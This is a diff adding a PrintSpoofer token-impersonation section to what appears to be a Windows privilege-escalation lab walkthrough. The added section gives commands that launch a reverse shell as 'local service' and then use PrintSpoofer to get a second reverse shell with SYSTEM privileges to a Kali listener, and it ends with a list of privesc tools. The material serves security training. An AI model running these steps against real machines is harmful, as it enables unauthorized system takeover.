@@ -277,3 +277,28 @@ Now, in the "local service" reverse shell you triggered, run the RoguePotato exp
 
 ![](.gitbook/assets/image%20%2843%29.png)
 
+### Token Impersonation - PrintSpoofer
+
+Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt \(right-click -&gt; run as administrator\) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:  
+
+
+`C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
+
+Start another listener on Kali.
+
+Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges \(update the IP address with your Kali IP accordingly\):
+
+`C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`
+
+### Privesc Tools
+
+winPEASany.exe
+
+Seatbelt.exe
+
+PowerUp.ps1
+
+SharpUp.exe
+
+
+
